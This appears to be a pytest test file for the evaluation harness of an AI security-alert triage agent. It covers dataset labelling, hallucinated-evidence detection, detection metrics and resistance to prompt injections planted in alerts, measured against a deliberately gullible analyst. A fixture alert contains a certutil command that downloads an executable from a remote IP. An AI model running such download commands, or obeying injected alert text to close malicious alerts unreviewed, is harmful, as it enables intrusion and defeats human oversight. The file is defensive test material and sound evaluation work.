from __future__ import annotations

from collections import Counter

import pytest

from agent.investigator import Investigation
from agent.verdict import Verdict
from eval.analysts import GullibleAnalyst, RuleBasedAnalyst
from eval.dataset import EvalCase, build_cases
from eval.harness import CaseResult, main, results_table, run_cases, summarize, unsupported_claims


def result(case: EvalCase, trace: list[dict[str, object]] | None = None, **verdict: object) -> CaseResult:
    fields: dict[str, object] = {"is_malicious": case.is_malicious, "confidence": 0.5} | verdict
    investigation = Investigation(Verdict.model_validate(fields), trace or [], input_tokens=1000, output_tokens=200)
    return CaseResult(case, investigation, seconds=0.5)


def case(is_malicious: bool = True, injected: bool = False) -> EvalCase:
    alert = {"event_id": "c", "command_line": "certutil -f http://203.0.113.9/a.bin a.exe"}
    return EvalCase("c", "s", alert, is_malicious, ("T1105",) if is_malicious else (), injected)


def test_dataset_is_large_labelled_and_reproducible() -> None:
    cases = build_cases()
    assert len(cases) == 126
    assert len({c.case_id for c in cases}) == 126
    assert Counter(c.is_malicious for c in cases) == {True: 72, False: 54}
    assert sum(c.injected for c in cases) == 30
    assert all(c.techniques for c in cases if c.is_malicious)
    assert not any(c.techniques for c in cases if not c.is_malicious)
    assert cases == build_cases()
    assert cases != build_cases(seed=8)


def test_unsupported_claims_flags_invented_specifics() -> None:
    trace: list[dict[str, object]] = [{"tool": "get_ip_reputation", "output": '{"ip": "198.51.100.7"}'}]
    checked = result(
        case(),
        trace,
        evidence=[
            "certutil fetched a.bin from 203.0.113.9",  # in the alert
            "the address 198.51.100.7 has a poor reputation",  # in tool output
            "mimikatz.exe was dropped by 10.9.9.9",  # invented
            "the activity looks suspicious",  # nothing checkable
        ],
    )
    assert unsupported_claims(checked) == (1, 3)


def test_summary_metrics_on_a_known_outcome() -> None:
    results = [
        result(case(), attack_techniques=["T1105"]),  # true positive, right technique
        result(case(), attack_techniques=["T1059"]),  # true positive, wrong technique
        result(case(), is_malicious=False),  # false negative
        result(case(is_malicious=False), is_malicious=True),  # false positive
        result(case(injected=True), is_malicious=False),  # hijacked and silently closed
        result(case(injected=True), is_malicious=False, needs_human_review=True),  # hijacked but escalated
    ]
    summary = summarize(results, usd_per_mtok_in=3.0, usd_per_mtok_out=15.0)
    assert summary["detection_precision"] == pytest.approx(2 / 3)
    assert summary["detection_recall"] == pytest.approx(2 / 5)
    assert summary["technique_hit_rate"] == pytest.approx(1 / 5)
    assert summary["injection_resistance"] == pytest.approx(1 / 2)
    assert summary["raw_injection_obedience"] == pytest.approx(1.0)
    assert summary["human_review_rate"] == pytest.approx(1 / 6)
    assert summary["mean_latency_ms"] == pytest.approx(500.0)
    assert summary["cost_per_alert_usd"] == pytest.approx((1000 * 3 + 200 * 15) / 1e6)


def test_guardrails_reduce_the_damage_of_a_hijacked_model() -> None:
    cases = build_cases()
    honest = summarize(run_cases(cases, RuleBasedAnalyst()))
    hijacked = summarize(run_cases(cases, GullibleAnalyst()))
    assert honest["detection_precision"] == 1.0
    assert honest["hallucination_rate"] == 0.0
    assert hijacked["raw_injection_obedience"] > honest["raw_injection_obedience"]
    # The model obeyed most injections, yet fewer were silently closed than it obeyed.
    assert 1 - hijacked["injection_resistance"] < hijacked["raw_injection_obedience"]
    assert hijacked["human_review_rate"] > honest["human_review_rate"]


def test_cli_prints_a_results_table(capsys: pytest.CaptureFixture[str]) -> None:
    assert main(["--analyst", "rule"]) == 0
    output = capsys.readouterr().out
    assert output.startswith("injection detection: patterns only\n\n| metric | rule |")  # no classifier built in tests
    assert "| alerts | 126 |" in output
    assert results_table({"a": {"alerts": 3.0, "detection_f1": 0.5}}).splitlines()[2:] == [
        "| alerts | 3 |",
        "| detection_f1 | 0.5000 |",
    ]
